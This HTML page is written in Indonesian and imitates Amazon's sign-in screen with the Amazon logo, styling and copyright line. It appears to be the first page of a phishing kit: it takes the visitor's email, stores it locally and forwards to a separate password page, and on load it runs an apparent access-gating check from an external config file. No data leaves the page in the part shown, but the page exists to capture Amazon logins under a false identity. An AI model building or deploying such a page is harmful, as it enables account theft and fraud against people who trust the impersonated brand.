<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <script src="config.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            if (!await CONFIG.cekAkses()) return;
        });
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
        .logo { margin: 10px 0 25px; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 20px; }
        label { font-size: 13px; font-weight: 700; display: block; margin-bottom: 6px; }
        input { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 15px; }
        input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
        button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; }
        button:hover { background: #F7CA00; }
        .garis { height: 1px; background: #e7e7e7; margin: 25px 0; }
        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
        .pesan { color: #d00; font-size: 13px; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Masuk</h1>
        <label for="email">Alamat email</label>
        <input type="email" id="email" placeholder="email@contoh.com">
        <div class="pesan" id="pesanKosong">Masukkan alamat email Anda</div>
        <button onclick="lanjut()">Lanjutkan</button>
        <div class="garis"></div>
    </div>
    <div class="footer">
        <a href="#">Syarat Penggunaan</a>
        <a href="#">Pemberitahuan Privasi</a>
        <a href="#">Bantuan</a>
        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. atau afiliasinya</p>
    </div>

    <script>
        function lanjut() {
            const email = document.getElementById('email').value.trim();
            if (!email) {
                document.getElementById('pesanKosong').style.display = 'block';
                document.getElementById('email').focus();
                return;
            }
            localStorage.setItem('emailPengguna', email);
            window.location.href = 'password.html';
        }
        document.getElementById('email').addEventListener('keypress', e => {
            if (e.key === 'Enter') lanjut();
        });
    </script>
</body>
</html>
